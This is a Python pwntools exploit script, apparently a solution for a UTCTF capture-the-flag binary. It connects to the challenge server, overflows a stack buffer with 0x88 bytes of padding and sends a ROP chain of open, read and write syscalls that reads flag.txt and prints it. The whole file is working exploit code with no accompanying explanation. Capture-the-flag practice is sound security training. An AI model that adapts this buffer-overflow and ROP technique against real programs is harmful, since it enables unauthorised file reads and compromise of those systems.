from pwn import *
from icecream import ic

elf = exe = ELF("./chal")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challenge.utctf.live", 5141)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x4019ae
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

pop_rdi = qgad(elf, "rdi")
pop_rsi_r15 = 0x000000000040204d
pop_rax = qgad(elf, "rax")
pop_rdx = 0x000000000048630b
syscall = 0x000000000041ae16
mov = 0x0000000000433a83
bss = elf.bss() + 0x1000

payload = b'a' * 0x88
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += b'flag.txt'
payload += p64(0)
payload += p64(mov)

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(0)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(0x5)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(bss)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(200)
payload += p64(0)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(bss)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(200)
payload += p64(0)
payload += p64(syscall)

sl(payload)

io.interactive()
